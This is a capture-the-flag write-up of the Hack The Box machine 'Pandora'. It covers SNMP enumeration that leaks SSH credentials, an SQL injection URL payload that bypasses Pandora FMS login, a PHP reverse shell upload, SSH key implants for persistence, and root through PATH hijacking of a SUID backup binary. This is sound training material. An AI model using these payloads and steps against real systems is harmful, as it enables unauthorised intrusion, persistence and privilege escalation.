# Pandora Writeup

## Enumeration

### Nmap

First, let's scan for open ports using `nmap`. We can quickly scan for open ports and store them in a variable: `ports=$(nmap -p- --min-rate=1000 -T4 10.10.11.136 | grep "^[0-9]" | cut -d '/' -f 1 | tr '\n' ',' | sed s/,$//)`. Then, we can scan those specific ports in depth by running `nmap`'s built-in scripts: `nmap -p$ports -sC -sV 10.10.11.136`.

```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 24:c2:95:a5:c3:0b:3f:f3:17:3c:68:d7:af:2b:53:38 (RSA)
|   256 b1:41:77:99:46:9a:6c:5d:d2:98:2f:c0:32:9a:ce:03 (ECDSA)
|_  256 e7:36:43:3b:a9:47:8a:19:01:58:b2:bc:89:f6:51:08 (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-title: Play | Landing
|_http-server-header: Apache/2.4.41 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Scan for UDP services with `sudo nmap -p- -sU -r -T5 10.10.11.136 -v` (`-r` specifies that ports will be scanned sequentially instead of randomly. we do this because services are more likely to be running on ports 1-1000.):

```
Scanning pandora.htb (10.10.11.136) [65535 ports]
Warning: 10.10.11.136 giving up on port because retransmission cap hit (2).
Discovered open port 161/udp on 10.10.11.136
Increasing send delay for 10.10.11.136 from 0 to 50 due to 11 out of 19 dropped probes since last increase.
UDP Scan Timing: About 0.86% done
```

So, port `161/udp` is open.

### Apache (Port `80`)

Let's brute force directories with `ffuf -w /usr/share/seclists/Discovery/Web-Content/big.txt -u http://10.10.11.136/FUZZ`:

```
.htaccess               [Status: 403, Size: 277, Words: 20, Lines: 10]
.htpasswd               [Status: 403, Size: 277, Words: 20, Lines: 10]
assets                  [Status: 301, Size: 313, Words: 20, Lines: 10]
server-status           [Status: 403, Size: 277, Words: 20, Lines: 10]
```

This doesn't find anything useful. Using the larger `/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt` wordlist also doesn't find anything useful.

The site mentions `panda.htb`, so we'll add that to our `/etc/hosts` file with `echo "10.10.11.136 panda.htb" | sudo tee -a /etc/hosts`. Trying to find other possible virtual hosts with `ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt -u http://panda.htb -H "Host: FUZZ.panda.htb" -fl 908` for both `panda.htb` and `pandora.htb` does not yield any results.

### SNMP (UDP Port `161`)

Let's scan port `161/udp` individually with `nmap` by running `sudo nmap -p161 -sU -T5 -sC -sV 10.10.11.136 > nmap_port161udp_scan.txt`: [nmap_port161udp_scan.txt](nmap_port161udp_scan.txt). This scan is quite large, which is why we pipe it into a file.

#### Learning about SNMP

The scan shows that we're dealing with Simple Network Management Protocol (SNMP), which "is a protocol used to monitor different devices in the network (like routers, switches, printers, IoTs...)" ([quote from HackTricks](https://book.hacktricks.xyz/pentesting/pentesting-snmp#snmp-explained)). According to HackTricks, "MIB stands for Management Information Base and is a collection of information organized hierarchically. These are accessed using a protocol such as SNMP... OIDs stands for Object Identifiers. OIDs uniquely identify managed objects in a MIB hierarchy." You can read the [HackTricks page on SNMP](https://book.hacktricks.xyz/pentesting/pentesting-snmp) for more information.

In order to access the information saved on the MIB, we need to know the community string in version 1 of SNMP. This acts as a sort of password but it is sent in plain text. By default, SNMP's read only functions use the community string `public`.

To enumerate SNMP, we’ll use `snmpwalk`. `snmpwalk` attempts to walk through all of the available MIBs and retrieve the information. "Before running our `snmpwalk` command, we should install `snmp-mibs-downloader`. This package will install all of the MIB files that aren’t included by default due to licensing issues" ([quote from epi052.gitlab.io](https://epi052.gitlab.io/notes-to-self/blog/2018-11-24-hack-the-box-mischief/)). We will run `sudo apt-get install snmp-mibs-downloader; sudo download-mibs` to get the MIB files.

According to [i052.gitlab.io](https://epi052.gitlab.io/notes-to-self/blog/2018-11-24-hack-the-box-mischief/), "after installing the package, we need to comment out the `mibs :` line in `/etc/snmp/snmp.conf`. Doing this configures snmp to use the freshly downloaded MIBs."

Finally, we can enumerate SNMP with `snmpwalk -Os -c public -v 1 10.10.11.136`. This will output a lot of data, so redirecting to a file is recommended: [complete_snmpwalk_output.txt](complete_snmpwalk_output.txt).

## Foothold

Anyway, the piece of information we are looking for is contained in both the `snmpwalk` output and the `nmap` output because we used `-sC` to run scripts (specifically the `snmp-processes` nmap script was run). Looking at process id `855` in either script's output shows `/bin/sh` being ran withe parameters `-c sleep 30; /bin/bash -c '/usr/bin/host_check -u daniel -p HotelBabylon23'`:

```
|   855: 
|     Name: sh
|     Path: /bin/sh
|     Params: -c sleep 30; /bin/bash -c '/usr/bin/host_check -u daniel -p HotelBabylon23'
```

Running `ssh daniel@pandora.htb` and using `HotelBabylon23` as the password to login works.

Running `cat /etc/passwd` shows that the user with id `1000` is `matt`. The `user.txt` flag is in `matt`'s home folder, which we can see by running `ls /home/matt`.

## Lateral Movement

We login over SSH to the `daniel` user with `pwncat` by running `pwncat-cs daniel@pandora.htb`.

Let's check out the process that was being run that gave us the login information. Running the same command `/usr/bin/host_check -u daniel -p HotelBabylon23` produces:

```
PandoraFMS host check utility
Now attempting to check PandoraFMS registered hosts.
Files will be saved to ~/.host_check
```

`cat ~/.host_check`:

```
1;localhost.localdomain;192.168.1.42;Created by localhost.localdomain;Linux;;09fbaa6fdf35afd44f8266676e4872f299c1d3cbb9846fbe944772d913fcfc69;3
2;localhost.localdomain;;Pandora FMS Server version 7.0NG.742_FIX_PERL2020;Linux;;localhost.localdomain;3
```

Looks like there is a service running on `localhost.localdomain`. Let's see what it is with `curl localhost.localdomain`, which shows `<meta HTTP-EQUIV="REFRESH" content="0; url=/pandora_console/">`. Running `curl localhost.localdomain/pandora_console/` displays a whole website. Running `(netstat -punta || ss --ntpu) | grep "127.0"` to list open local ports doesn't show anything out of the ordinary so this web sever must be running as a different user:

```
(Not all processes could be identified, non-owned process info
 will not be shown, you would have to be root to see it all.)
tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      -
tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN      -
udp        0      0 127.0.0.1:56972         127.0.0.53:53           ESTABLISHED -
udp        0      0 127.0.0.53:53           0.0.0.0:*                           -
```

So, let's check out `/var/www/` since we know this machine is using Apache due to our first `nmap` scan. There are two folders in `/var/www/`: `html`, which contains the original website we accessed on port `80`, and `pandora`, which contains the new site we found running locally.

Listing the contents of this directory with `ls -la pandora_console/` shows a lot of files owned by `matt`

```
total 1596
drwxr-xr-x 16 matt matt    4096 Dec  7 14:32 .
drwxr-xr-x  3 matt matt    4096 Dec  7 14:32 ..
-rw-r--r--  1 matt matt    3746 Jan  3  2020 ajax.php
drwxr-xr-x  6 matt matt    4096 Dec  7 14:32 attachment
-rw-r--r--  1 matt matt    1175 Jun 17  2021 audit.log
-rw-r--r--  1 matt matt     534 Jan  3  2020 AUTHORS
-rw-r--r--  1 matt matt     585 Jan  3  2020 composer.json
-rw-r--r--  1 matt matt   16003 Jan  3  2020 composer.lock
-rw-r--r--  1 matt matt   14875 May 17  2019 COPYING
-rw-r--r--  1 matt matt     506 Jan  3  2020 DB_Dockerfile
drwxr-xr-x  2 matt matt    4096 Dec  7 14:32 DEBIAN
-rw-r--r--  1 matt matt    3366 Jan  3  2020 docker_entrypoint.sh
-rw-r--r--  1 matt matt    1263 Jan  3  2020 Dockerfile
drwxr-xr-x 11 matt matt    4096 Dec  7 14:32 extensions
drwxr-xr-x  4 matt matt    4096 Dec  7 14:32 extras
drwxr-xr-x  2 matt matt    4096 Dec  7 14:32 fonts
drwxr-xr-x  5 matt matt    4096 Dec  7 14:32 general
drwxr-xr-x 20 matt matt    4096 Dec  7 14:32 godmode
drwxr-xr-x 21 matt matt   36864 Dec  7 14:32 images
drwxr-xr-x 21 matt matt    4096 Dec  7 14:32 include
-rw-r--r--  1 matt matt   52704 Dec  2 12:06 index.php
-rw-r--r--  1 matt matt   42398 Jan  3  2020 install.done
drwxr-xr-x  5 matt matt    4096 Dec  7 14:32 mobile
drwxr-xr-x 15 matt matt    4096 Dec  7 14:32 operation
-rw-r--r--  1 matt matt    1302 Feb 22 02:52 pandora_console.log
-rw-r--r--  1 matt matt     234 May 17  2019 pandora_console_logrotate_centos
-rw-r--r--  1 matt matt     171 May 17  2019 pandora_console_logrotate_suse
-rw-r--r--  1 matt matt     222 May 17  2019 pandora_console_logrotate_ubuntu
-rw-r--r--  1 matt matt    4883 May 17  2019 pandora_console_upgrade
-rw-r--r--  1 matt matt 1168598 Jan  3  2020 pandoradb_data.sql
-rw-r--r--  1 matt matt  160283 Jan  3  2020 pandoradb.sql
-rw-r--r--  1 matt matt     476 Jan  3  2020 pandora_websocket_engine.service
drwxr-xr-x  3 matt matt    4096 Dec  7 14:32 tests
drwxr-xr-x  2 matt matt    4096 Dec  7 14:32 tools
drwxr-xr-x 11 matt matt    4096 Dec  7 14:32 vendor
-rw-r--r--  1 matt matt    4856 Jan  3  2020 ws.php
```

So, the new web server is running under `matt`'s user so this is almost certainly our lateral movement vector.

Running `cat /etc/apache2/sites-enabled/pandora.conf` to look at the Apache confiuration for this site shows that it is indeed running under the `matt` user:

```
<VirtualHost localhost:80>
  ServerAdmin admin@panda.htb
  ServerName pandora.panda.htb
  DocumentRoot /var/www/pandora
  AssignUserID matt matt
  <Directory /var/www/pandora>
    AllowOverride All
  </Directory>
  ErrorLog /var/log/apache2/error.log
  CustomLog /var/log/apache2/access.log combined
</VirtualHost>
```

This file also lets us know that it is running locally on port `80`. So, let's forward that to our attack machine with `ssh -L 8080:localhost:80 daniel@pandora.htb`. Now, navigating to `http://localhost:8080/pandora_console/` brings us to a login page.

Trying to authenticate using the only set of credentials we have `daniel:HotelBabylon23` results in a message appearing that says "User only can use the API."

It looks like [PandoraFMS](https://pandorafms.com/) is a legit product. Searching for the version string at the bottom of the page finds [CVE-2020-5844](https://nvd.nist.gov/vuln/detail/CVE-2020-5844), but it looks like this requires us to be an "authenticated administrator," which we are not. We also find [the metasploit module pandora_fms_events_exec](https://www.rapid7.com/db/modules/exploit/linux/http/pandora_fms_events_exec/). However, " Valid credentials for a Pandora FMS account are required."

Searching for "pandora fms 742 exploit" finds [Pandora FMS 742: Critical Code Vulnerabilities Explained](https://blog.sonarsource.com/pandora-fms-742-critical-code-vulnerabilities-explained), which mentions a SQL Injection pre authentication exploit (CVE-2021-32099): "Our focus is on a severe SQL injection vulnerability. It can be remotely exploited without any access privileges and enables an attacker to completely bypass the administrator authentication. This enables in the end to execute arbitrary code on the system." [CVE-2021-32099](https://nvd.nist.gov/vuln/detail/CVE-2021-32099) is "a SQL injection vulnerability in the pandora_console component of Artica Pandora FMS 742 allows an unauthenticated attacker to upgrade his unprivileged session via the /include/chart_generator.php session_id parameter, leading to a login bypass."

Searching for CVE-2021-32099 finds [ibnuuby/CVE-2021-32099](https://github.com/ibnuuby/CVE-2021-32099), which contains a proof of concept:

```
POC : http://localhost:8000/pandora_console/include/chart_generator.php?session_id=a%27%20UNION%20SELECT%20%27a%27,1,%27id_usuario|s:5:%22admin%22;%27%20as%20data%20FROM%20tsessions_php%20WHERE%20%271%27=%271
```

We can change the port from the proof of concept from `8000` to `8080` since that is what we are using. Now, going to `http://localhost:8080/pandora_console/include/chart_generator.php?session_id=a%27%20UNION%20SELECT%20%27a%27,1,%27id_usuario|s:5:%22admin%22;%27%20as%20data%20FROM%20tsessions_php%20WHERE%20%271%27=%271` in your browser and then navigating back to `http://localhost:8080/pandora_console/` will log you into PandoraFMS as an administrator. A video of this happening can be seen on the blog post linked from the repo: [Pandora FMS 742: Critical Code Vulnerabilities Explained](https://blog.sonarsource.com/pandora-fms-742-critical-code-vulnerabilities-explained).

Clicking on `admin` in the top right brings you to a page where you can edit your user's details. I changed the password to `admin` and then clicked "Update" at the bottom.

Now that we have the credentials to an account, let's try some of the previous exploits we found. For metasploit, run the following:

```
sudo msfconsole
use exploit/linux/http/pandora_fms_events_exec
set password admin
set rport 8080
set rhosts localhost
set lhost tun0
set autocheck false
run
```

This exploit fails. The exploit `linux/http/pandora_ping_cmd_exec` also fails even after I created a new user in the interface. [This exploit-db script](https://www.exploit-db.com/exploits/48064) fails as well. Also, [TheCyberGeek/CVE-2020-5844](https://github.com/TheCyberGeek/CVE-2020-5844) fails too. TheCyberGeek's script probably is supposed to work since he is one of the creators of this box. Additionally, after solving the box, I found this repo: [shyam0904a/Pandora_v7.0NG.742_exploit_unauthenticated](https://github.com/shyam0904a/Pandora_v7.0NG.742_exploit_unauthenticated). So, this exploit might also work.

Since we are an administrator we can upload files by going to `Admin tools > File manager` on the left. So, lets get a PHP reverse shell with `wget https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php`, edit in our ip address and port, start a listener with `nc -nvlp 28600` and then go to `http://localhost:8080/pandora_console/images/php-reverse-shell.php` on the server to get a reverse shell. This is successful!

We can get persistance with `run implant.authorized_key key=/home/kali/.ssh/id_rsa` in `pwncat`. I set the permissions of the `.ssh` folder to be what they should be with `chmod 700 .ssh && chmod 600 .ssh/authorized_keys`.

We can finally run `cat /home/matt/user.txt` to get the `user.txt` flag.

## Privilege Escalation

First, we  connect with `pwncat-cs matt@pandora.htb --identity /home/kali/.ssh/id_rsa` for a stable shell. I use `pwncat` and upload LinPEAS with `upload linpeas.sh` then run it with `bash linpeas.sh`.

In the LinPEAS output we see:

```
Readable files belonging to root and readable by me but not world readable
-rwsr-x--- 1 root matt 16816 Dec  3 15:58 /usr/bin/pandora_backup
-rw-r----- 1 root matt 33 Feb 22 02:52 /home/matt/user.txt
```

Running `ls -la /usr/bin/pandora_backup` shows that this is a SUID binary. Running the actual `/usr/bin/pandora_backup` script appears to create a `tar` archive of the `/var/www/pandora/pandora_console/` directory.

We can run `download /usr/bin/pandora_backup` to download it to our local machine with `pwncat` since the target machine does not have the `strings` command.

Running `strings pandora_backup` shows `tar -cvf /root/.backup/pandora-backup.tar.gz /var/www/pandora/pandora_console/*` in the output. So, it looks like it is just running the `tar` binary from a relative path. We can create a new file called `tar` in our home directory that simply runs `/bin/bash` with `mkdir ~/bin; echo "/bin/bash" > ~/bin/tar`. Set the new "tar" file to executable with `chmod +x ~/bin/tar`. Now, we can add that to our path ahead of any other directory with `export PATH=/home/matt/bin:$PATH`. Now, we can run the SUID binary again: `/usr/bin/pandora_backup`.

Finally, we run `cat /root/root.txt` to get the `root.txt` flag.

We can get persistance as root with `run implant.authorized_key key=/home/kali/.ssh/id_rsa` in `pwncat`.
